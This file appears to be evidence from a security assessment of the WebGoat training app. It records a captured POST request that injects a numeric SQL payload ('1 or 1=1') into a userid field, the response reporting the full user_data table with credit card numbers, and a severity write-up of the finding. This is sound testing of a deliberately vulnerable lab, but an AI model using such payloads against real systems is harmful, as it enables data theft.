@@ -1,0 +1,37 @@
+Lesson: SQL Injection (intro) / assignment SqlInjectionLesson5b (Numeric SQL injection)
+Captured via Chrome DevTools Network panel (live browser interaction), Run #9, 2026-11-16T11:15:45Z
+Note: lessonoverview.mvc showed this assignment already marked "solved": true from a prior session (Run #3
+per intake Section 3f history). This evidence file documents THIS run's own fresh injection attempt/capture,
+per Section 3d's timestamp-window rule - it is not reused from a prior run.
+
+### Request
+POST http://10.242.10.31:8007/WebGoat/SqlInjection/assignment5b HTTP/1.1
+Referer: http://10.242.10.31:8007/WebGoat/start.mvc
+X-Requested-With: XMLHttpRequest
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Content-Length: 31
+Cookie: JSESSIONID=EB5681DBBE34AF0FD5E2A4E855CBA117
+Origin: http://10.242.10.31:8007
+Host: 10.242.10.31:8007
+
+login_count=0&userid=1+or+1%3D1
+
+### Response
+HTTP/1.1 200
+Content-Type: application/json
+Content-Length: 1182
+
+{
+  "assignment" : "SqlInjectionLesson5b",
+  "attemptWasMade" : true,
+  "feedback" : "You have succeeded: <p>USERID, FIRST_NAME, LAST_NAME, CC_NUMBER, CC_TYPE, COOKIE, LOGIN_COUNT, ... [full user_data table incl. credit card numbers - identical dataset to assignment5a] ...</p>",
+  "lessonCompleted" : true,
+  "output" : "Your query was: SELECT * From user_data WHERE Login_Count = 0 and userid= 1 or 1=1"
+}
+
+### Analysis (finding F-SQLI-02)
+Numeric (unquoted) SQL injection via the User_Id field: injecting `1 or 1=1` into a field used unparameterized
+in a numeric context broke out of the intended WHERE clause and returned the entire user_data table including
+credit card numbers, confirming the same injection class (ASVS V1.2.4) is independently exploitable via a
+second, differently-shaped input (numeric concatenation vs. string concatenation in F-SQLI-01).
+Severity: HIGH per Section 3j rubric - full-table sensitive-data exfiltration without RCE.
